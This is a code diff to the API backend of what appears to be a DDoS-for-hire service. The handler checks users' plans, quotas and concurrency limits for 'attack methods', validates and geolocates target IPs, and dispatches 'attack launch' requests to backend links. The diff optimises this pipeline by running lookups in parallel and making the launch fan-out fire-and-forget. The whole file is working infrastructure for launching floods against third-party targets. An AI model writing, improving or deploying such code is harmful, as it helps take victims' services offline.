@@ -86,31 +86,36 @@ function expandApiLinkTemplate(template, record) {
   return expanded;
 }
 
-async function fanOutMethodApiLinks(methodMeta, record) {
+export async function fanOutMethodApiLinks(methodMeta, record) {
   const apiLinks = Array.isArray(methodMeta?.api_links) ? methodMeta.api_links : [];
   if (!apiLinks.length) return [];
 
-  const outcomes = [];
-
-  for (const link of apiLinks) {
+  const outcomes = await Promise.all(apiLinks.map(async (link) => {
     const destination = link?.url || '';
-    if (!destination) continue;
+    if (!destination) {
+      return {
+        name: link?.name || 'api_link',
+        url: '',
+        method: String(link?.method || 'GET').toUpperCase(),
+        status: 0,
+        ok: false,
+        error: 'missing_destination'
+      };
+    }
 
     const url = expandApiLinkTemplate(destination, record);
     const method = String(link?.method || 'GET').toUpperCase();
 
-    // Acquire slot for this outgoing request
     const slotAcquired = await acquireOutgoingRequestSlot(5000);
     if (!slotAcquired) {
-      outcomes.push({
+      return {
         name: link?.name || 'api_link',
         url,
         method,
         status: 0,
         ok: false,
         error: 'outgoing_request_limit_exceeded'
-      });
-      continue;
+      };
     }
 
     try {
@@ -134,38 +139,36 @@ async function fanOutMethodApiLinks(methodMeta, record) {
         init.body = params.toString();
       }
 
-      // Wrap fetch with timeout protection for attack launches
       const response = await withTimeout(
         fetch(url, init),
-        TIMEOUT_CONFIG.ATTACK_LAUNCH_TIMEOUT_MS,
+        Math.min(TIMEOUT_CONFIG.ATTACK_LAUNCH_TIMEOUT_MS, 1500),
         `Attack launch to ${link?.name || 'backend'}`
       );
       const text = await response.text();
       let payload = null;
       try { payload = text ? JSON.parse(text) : null; } catch (_) { payload = { raw: text }; }
 
-      outcomes.push({
+      return {
         name: link?.name || 'api_link',
         url,
         method,
         status: response.status,
         ok: response.ok,
         payload
-      });
+      };
     } catch (e) {
-      outcomes.push({
+      return {
         name: link?.name || 'api_link',
         url,
         method,
         status: 0,
         ok: false,
         error: e?.message || 'api link failed'
-      });
+      };
     } finally {
-      // Always release the outgoing request slot
       releaseOutgoingRequestSlot();
     }
-  }
+  }));
 
   return outcomes;
 }
@@ -178,9 +181,9 @@ export async function apiHandler(parts, request, env, requestId, logger, request
   const endpoint = parts[0] || '';
   const GLOBAL_API_SLOTS = Number(env.GLOBAL_API_SLOTS || 30);
 
-  // Load service name and version from database once per request
-  const serviceName = await Vault.getServiceName(env);
-  const apiVersion = await Vault.getApiVersion(env);
+  // Reuse service metadata already loaded by the request orchestrator when available.
+  const serviceName = requestContext?.serviceName || await Vault.getServiceName(env);
+  const apiVersion = requestContext?.apiVersion || await Vault.getApiVersion(env);
 
   let requestUser = requestContext.user || null;
 
@@ -794,7 +797,7 @@ export async function apiHandler(parts, request, env, requestId, logger, request
       created_at: new Date().toISOString()
     };
 
-    const user = record.username ? await Vault.getUser(env, record.username) : null;
+    const user = requestContext?.user || (record.username ? await Vault.getUser(env, record.username) : null);
     if (!user) return makePolishedError('user does not exist', 404, { hint: 'Verify the username supplied in the request.' });
     if (!user.username) return makePolishedError('user record is invalid', 500, { hint: 'User account data is corrupted. Contact support.' });
 
@@ -840,9 +843,11 @@ export async function apiHandler(parts, request, env, requestId, logger, request
     if (!ALLOWED_METHODS[record.method]) return makePolishedError(`method ${record.method} is not supported`, 400, { hint: 'Use one of the supported attack methods listed by the methods catalog.' });
     const expects = ALLOWED_METHODS[record.method];
     const payloadMethods = getPayloadMethods();
+    const payloadMethodMap = new Map((payloadMethods || []).map((item) => [String(item?.name || '').toLowerCase(), item]));
     const methodsCatalog = await Vault.listMethods(env);
     const methodNames = (methodsCatalog || []).map(m => (m.name || '').toLowerCase());
-    
+    const catalogMethodMap = new Map((methodsCatalog || []).map((item) => [String(item?.name || '').toLowerCase(), item]));
+
     // Sync payload methods if any are missing from the database
     if (!methodNames.includes(record.method)) {
       try {
@@ -855,8 +860,9 @@ export async function apiHandler(parts, request, env, requestId, logger, request
       }
     }
 
-    const dbMethodMeta = (methodsCatalog || []).find(m => (m.name || '').toLowerCase() === record.method) || null;
-    const targetType = String((dbMethodMeta?.target_type || payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.target_type || expects || 'ip')).toLowerCase();
+    const payloadMeta = payloadMethodMap.get(record.method) || null;
+    const dbMethodMeta = catalogMethodMap.get(record.method) || null;
+    const targetType = String((dbMethodMeta?.target_type || payloadMeta?.target_type || expects || 'ip')).toLowerCase();
     const targetProvided = String(record.target || '').trim();
 
     if (targetType === 'ip' && !isIPv4(targetProvided)) {
@@ -873,22 +879,24 @@ export async function apiHandler(parts, request, env, requestId, logger, request
     }
 
     const methodMeta = {
-      ...(payloadMethods.find(m => (m.name || '').toLowerCase() === record.method) || {}),
+      ...(payloadMeta || {}),
       ...(dbMethodMeta || {}),
       name: record.method,
-      enabled: dbMethodMeta?.enabled ?? payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.enabled ?? true,
-      max_slots: dbMethodMeta?.max_slots ?? payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.max_slots ?? 0,
-      max_time: dbMethodMeta?.max_time ?? payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.max_time ?? null,
-      max_concurrents: dbMethodMeta?.max_concurrents ?? payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.max_concurrents ?? 1,
+      enabled: dbMethodMeta?.enabled ?? payloadMeta?.enabled ?? true,
+      max_slots: dbMethodMeta?.max_slots ?? payloadMeta?.max_slots ?? 0,
+      max_time: dbMethodMeta?.max_time ?? payloadMeta?.max_time ?? null,
+      max_concurrents: dbMethodMeta?.max_concurrents ?? payloadMeta?.max_concurrents ?? 1,
       target_type: targetType,
-      default_port: dbMethodMeta?.default_port ?? payloadMethods.find(m => (m.name || '').toLowerCase() === record.method)?.default_port ?? 80
+      default_port: dbMethodMeta?.default_port ?? payloadMeta?.default_port ?? 80
     };
     const policyResult = isMethodPermittedForUser(user, methodMeta);
     if (!policyResult.allowed) return makePolishedError(`method ${record.method} is blocked by policy (${policyResult.reason})`, 403, { hint: 'Upgrade the account plan or remove the policy restriction for this method.' });
 
     const payloadBlacklists = getPayloadBlacklists();
-    const ipinfo = await ipLookup(record.target) || {};
-    const blacklistRows = await Vault.listBlacklist(env);
+    const [ipinfo, blacklistRows] = await Promise.all([
+      ipLookup(record.target),
+      Vault.listBlacklist(env)
+    ]);
     const blacklistTargets = [
       ...(payloadBlacklists?.Blacklists_Targets || []),
       ...(blacklistRows || []).map(item => item.target)
@@ -924,8 +932,16 @@ export async function apiHandler(parts, request, env, requestId, logger, request
       return makePolishedError(`requested time exceeds the maximum allowed time of ${effectiveMaxTime}`, 400, { hint: `Lower the duration to ${effectiveMaxTime} seconds or less for this method and plan.` });
     }
 
-    const todays = await Vault.countUserDailyAttacks(env, record.username);
     const maxDailyAttacks = Number(user?.max_daily_attacks || 0);
+    const methodMaxSlots = Number(methodMeta?.max_slots || 0);
+    const userBypass = Boolean(user?.bypass_slots || false);
+    const [todays, userOngoing, ongoing, methodOngoing] = await Promise.all([
+      Vault.countUserDailyAttacks(env, record.username),
+      Vault.countUserOngoing(env, record.username),
+      Vault.countOngoing(env),
+      methodMaxSlots > 0 ? Vault.countMethodOngoing(env, record.method) : Promise.resolve(0)
+    ]);
+
     if (maxDailyAttacks > 0 && todays >= maxDailyAttacks) {
       return makePolishedError('max daily attacks exceeded', 429, { hint: 'Wait until the daily quota resets or ask for a higher daily limit.' });
     }
@@ -940,28 +956,20 @@ export async function apiHandler(parts, request, env, requestId, logger, request
       );
     }
 
-    const userOngoing = await Vault.countUserOngoing(env, record.username);
     if (userOngoing !== null && userOngoing !== undefined) {
       if ((userOngoing + record.concurrents) > limits.maxConcurrents) {
         return makePolishedError(`requested concurrents would exceed user's allowed concurrents of ${limits.maxConcurrents} (current running: ${userOngoing})`, 400, { hint: 'Lower the concurrency value or wait for running attacks to finish.' });
       }
     }
 
-    const methodMaxSlots = Number(methodMeta?.max_slots || 0);
-    const ongoing = await Vault.countOngoing(env);
     if (ongoing === null || ongoing === undefined) {
       return makePolishedError('Unable to check slot availability', 500, { hint: 'Could not verify API slots. Please try again.' });
     }
-    
-    const userBypass = Boolean(user?.bypass_slots || false);
 
-    if (methodMaxSlots > 0) {
-      const methodOngoing = await Vault.countMethodOngoing(env, record.method);
-      if (methodOngoing !== null && methodOngoing !== undefined && methodOngoing >= methodMaxSlots) {
-        return makePolishedError(`method ${record.method} is at capacity`, 429, {
-          hint: `The ${record.method} method is at capacity (${methodOngoing}/${methodMaxSlots}). Try again when a slot frees up.`
-        });
-      }
+    if (methodMaxSlots > 0 && methodOngoing !== null && methodOngoing !== undefined && methodOngoing >= methodMaxSlots) {
+      return makePolishedError(`method ${record.method} is at capacity`, 429, {
+        hint: `The ${record.method} method is at capacity (${methodOngoing}/${methodMaxSlots}). Try again when a slot frees up.`
+      });
     }
 
     if (!userBypass && ongoing >= GLOBAL_API_SLOTS) {
@@ -989,10 +997,10 @@ export async function apiHandler(parts, request, env, requestId, logger, request
     await Vault.addLog(env, record);
     await Vault.addOngoingAttack(env, record);
 
-    const apiLinkExecutions = await fanOutMethodApiLinks(methodMeta, record);
+    void fanOutMethodApiLinks(methodMeta, record).catch(() => {});
 
     const attacks_remaining = Math.max(0, Number(user.max_daily_attacks || 0) - Number(todays || 0));
-    const ongoing_now = await Vault.countOngoing(env);
+    const ongoing_now = ongoing;
     const userServiceName = await resolveServiceName(user, env, serviceName);
     const attackEndTime = performance.now(); // End timing
     const executionTime = attackEndTime - attackStartTime; // Calculate execution time
@@ -1013,20 +1021,20 @@ export async function apiHandler(parts, request, env, requestId, logger, request
         threads: Number(record.threads || 0),
         rps: Number(record.rps || 0),
         geo: record.geo || 'full',
-        target_asn: ipinfo.as || ipinfo.org || null,
-        target_city: ipinfo.city || null,
-        target_country: ipinfo.country || null,
-        target_country_code: ipinfo.countryCode || null,
-        target_isp: ipinfo.isp || null,
-        target_org: ipinfo.org || null,
-        target_region: ipinfo.regionName || ipinfo.region || null,
-        target_timezone: ipinfo.timezone || null,
-        target_zip: ipinfo.zip || null,
+        ...(ipinfo.as || ipinfo.org ? { target_asn: ipinfo.as || ipinfo.org } : {}),
+        ...(ipinfo.city ? { target_city: ipinfo.city } : {}),
+        ...(ipinfo.country ? { target_country: ipinfo.country } : {}),
+        ...(ipinfo.countryCode ? { target_country_code: ipinfo.countryCode } : {}),
+        ...(ipinfo.isp ? { target_isp: ipinfo.isp } : {}),
+        ...(ipinfo.org ? { target_org: ipinfo.org } : {}),
+        ...(ipinfo.regionName || ipinfo.region ? { target_region: ipinfo.regionName || ipinfo.region } : {}),
+        ...(ipinfo.timezone ? { target_timezone: ipinfo.timezone } : {}),
+        ...(ipinfo.zip ? { target_zip: ipinfo.zip } : {}),
         username: user.username || qv.username || 'anon',
         max_time: Number(user.max_time || 60),
         max_concurrents: Number(user.max_concurrents || 1),
         method_max_slots: Number(methodMeta?.max_slots || 0),
-        method_active_slots: Number(await Vault.countMethodOngoing(env, record.method)),
+        method_active_slots: Number(methodOngoing),
         cooldown: Number(user.cooldown || 10),
         attacks_remaining: attacks_remaining,
         bypass_slots: Boolean(user.bypass_slots || 0),
